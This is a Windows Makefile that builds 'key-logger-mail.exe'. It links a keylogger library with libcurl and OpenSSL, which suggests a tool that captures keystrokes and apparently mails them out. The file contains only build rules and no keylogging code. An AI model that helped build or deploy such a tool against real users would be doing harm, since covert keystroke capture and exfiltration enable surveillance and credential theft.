#######################################################################################################
# Module history:                                                                                     #
#   Date:       Author:                    Reason:                                                    #
#   08.08.2023  Gaina Stefan               Initial version.                                           #
# Description: This Makefile is used to generate the keylogger executable.                            #
#######################################################################################################

CFLAGS  = -Wall -Werror
LDFLAGS = -Wl,-rpath='.' -L../key-logger/$(LIB)/  -lkeylogger \
		  -Wl,-rpath='.' -L../vendor/curl/$(LIB)/ -lcurl      \
		  -lws2_32

INCLUDES = -Iinclude/               \
		   -I../key-logger/include/ \
		   -I../vendor/curl/include/

SOURCES    := $(wildcard $(SRC)/*.c)
OBJECTS    := $(patsubst $(SRC)/%.c, $(OBJ)/%.o, $(SOURCES))
EXECUTABLE := key-logger-mail.exe

all: | create_dirs $(EXECUTABLE) copy_library

### CREATE DIRECTORIES ###
create_dirs:
	if not exist "$(OBJ)" mkdir $(OBJ)
	if not exist "$(BIN)" mkdir $(BIN)

### BINARIES ###
$(EXECUTABLE): $(OBJECTS)
	$(CC) $(CFLAGS) -o $(BIN)/$@ $^ $(LDFLAGS)

### OBJECTS ###
$(OBJ)/%.o: $(SRC)/%.c
	$(CC) $(CFLAGS) $(INCLUDES) -c $< -o $@

### COPY EXECUTABLE ###
copy_library:
	copy ..\key-logger\$(LIB)\libkeylogger.dll     $(BIN)
	copy ..\vendor\curl\$(LIB)\libcurl.dll         $(BIN)
	copy ..\vendor\curl\$(LIB)\libssl-3-x64.dll    $(BIN)
	copy ..\vendor\curl\$(LIB)\libcrypto-3-x64.dll $(BIN)

### CLEAN ###
clean:
	$(RM) $(OBJ)\*
	$(RM) $(BIN)\*
